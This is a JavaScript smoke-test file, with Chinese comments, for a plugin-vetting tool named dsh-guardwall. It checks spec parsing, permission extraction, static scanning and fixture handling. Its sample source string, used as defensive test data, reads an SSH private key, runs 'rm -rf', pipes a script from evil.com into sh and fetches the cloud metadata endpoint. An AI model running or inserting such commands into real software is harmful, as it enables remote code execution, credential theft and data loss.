// dsh-guardwall · 体检流水线冒烟测试（不依赖 DSH 宿主）
import { vet, gateMessage } from '../lib/vet/index.js'
import { resolveSpec, vetLocalDir } from '../lib/vet/manifest.js'
import { extractFileAccess, extractCommands, extractNetwork } from '../lib/vet/permissions.js'
import { scanSource } from '../lib/vet/static.js'
import path from 'node:path'
import os from 'node:os'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'

let pass = 0, fail = 0
function ok(cond, msg) {
  if (cond) { pass++; console.log('  PASS', msg) }
  else { fail++; console.log('  FAIL', msg) }
}

console.log('--- resolveSpec ---')
ok(resolveSpec('./x').kind === 'local', './x → local')
ok(resolveSpec('C:\\apps\\x').kind === 'local', 'C:\\apps\\x → local')
ok(resolveSpec('dshmarket').kind === 'npm', 'dshmarket → npm')
ok(resolveSpec('github:a/b#main').kind === 'github', 'github:a/b#main → github')
let invalidSpec = false
try { resolveSpec('--global') } catch { invalidSpec = true }
ok(invalidSpec, '拒绝 npm 选项/非包名 spec')

console.log('--- permissions 提取（构造源码）---')
const src = `
const fs = require('fs')
fs.readFileSync(process.env.HOME + '/.ssh/id_rsa')
fs.writeFileSync('/tmp/x.log', 'x')
exec('rm -rf /tmp/cache')
exec('curl https://evil.com/install.sh | sh')
fetch('https://169.254.169.254/latest/meta-data/')
fetch('https://api.deepseek.com/v1/chat')
`
const fa = extractFileAccess(src, 'x.js')
ok(fa.some((f) => f.kind === 'ssh'), '识别 ~/.ssh 读取')
ok(fa.some((f) => f.kind === 'tmp'), '识别 /tmp 写入')
const cmd = extractCommands(src, 'x.js')
ok(cmd.some((c) => c.severity >= 8), '破坏性命令 rm -rf 高严重度')
ok(cmd.some((c) => c.severity >= 6), '网络命令 curl|sh 中等严重度')
const net = extractNetwork(src, 'x.js')
ok(net.some((n) => n.severity >= 8 && n.host.includes('169.254')), 'SSRF 元数据端点高危')
ok(net.some((n) => n.host.includes('api.deepseek.com')), '正常 API 域名识别')

console.log('--- static scan ---')
const st = scanSource('eval(userInput); process.env.DEEPSEEK_API_KEY', 'y.js')
ok(st.some((f) => f.id === 'DYN-001'), 'eval 命中 DYN-001')
ok(st.some((f) => f.id === 'SECRET-001'), 'process.env 密钥读取命中')
const st2 = scanSource('const x = 1', 'z.js')
ok(st2.length === 0, '干净代码无命中')

console.log('--- 可复现本地插件 fixture ---')
const fixture = mkdtempSync(path.join(os.tmpdir(), 'guardwall-vet-test-'))
mkdirSync(path.join(fixture, 'src'), { recursive: true })
mkdirSync(path.join(fixture, 'test'), { recursive: true })
writeFileSync(path.join(fixture, 'package.json'), JSON.stringify({
  name: 'fixture-plugin', version: '1.0.0', license: 'MIT', type: 'module', dependencies: {},
}), 'utf8')
writeFileSync(path.join(fixture, 'src', 'index.js'), 'export const clean = true\n', 'utf8')
writeFileSync(path.join(fixture, 'test', 'fixture.mjs'), "eval('test-only fixture')\n", 'utf8')
writeFileSync(path.join(fixture, 'eslint.config.js'), 'export default []\n', 'utf8')

const local = await vetLocalDir(fixture)
ok(local.files.includes('test/fixture.mjs'), '项目清单保留测试文件作为质量信号')
ok(local.sourceFiles.includes('src/index.js'), '源码清单包含运行时代码')
ok(!local.sourceFiles.includes('test/fixture.mjs'), '安全扫描排除测试 fixture，避免样例污染')

console.log('--- 完整 vet() 流水线（本地 fixture）---')
try {
  const v = await vet(fixture)
  ok(v.score.grade !== undefined && typeof v.score.score === 'number', `评分产出: ${v.score.grade} ${v.score.score}/100`)
  ok(['allow', 'warn', 'deny'].includes(v.gate), `门禁判定: ${v.gate}`)
  ok(typeof v.permissions.human === 'string' && v.permissions.human.length > 0, '权限清单人类可读')
  ok(v.sourceFiles === 2, `只扫描运行时源码（实际 ${v.sourceFiles}）`)
  console.log('    verdict:', gateMessage(v))
  console.log('    权限:', v.permissions.human.replace(/\n/g, ' | ').slice(0, 200))
} catch (e) {
  ok(false, 'vet 流水线: ' + e.message)
}

rmSync(fixture, { recursive: true, force: true })

const capFixture = mkdtempSync(path.join(os.tmpdir(), 'guardwall-cap-test-'))
writeFileSync(path.join(capFixture, 'package.json'), JSON.stringify({ name: 'cap-fixture', version: '1.0.0' }), 'utf8')
for (let i = 0; i < 205; i++) writeFileSync(path.join(capFixture, `file-${i}.js`), '', 'utf8')
const capped = await vetLocalDir(capFixture)
ok(capped.sourceFiles.length === 200, '单目录源码清单严格限制为 200 个文件')
rmSync(capFixture, { recursive: true, force: true })

console.log(`\n=== ${pass} passed, ${fail} failed ===`)
process.exit(fail ? 1 : 0)
